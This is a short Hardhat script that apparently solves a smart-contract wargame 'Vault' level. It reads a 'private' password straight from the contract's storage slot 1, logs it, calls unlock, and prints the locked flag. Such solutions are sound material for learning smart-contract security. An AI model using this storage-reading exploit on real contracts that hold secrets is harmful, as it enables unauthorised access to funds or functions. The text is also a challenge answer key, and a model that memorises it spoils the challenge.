const hre = require("hardhat");
const ethers = hre.ethers;

require('dotenv').config()

async function main() {

  const vault = await ethers.getContractAt("Vault", process.env.VAULT_ADDR);

  const password = await ethers.provider.getStorageAt(process.env.VAULT_ADDR, 1)

  console.log(`password: ${password}`);

  await vault.unlock(password)

  console.log(`locked: ${await ethers.provider.getStorageAt(process.env.VAULT_ADDR, 0)}`);

}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
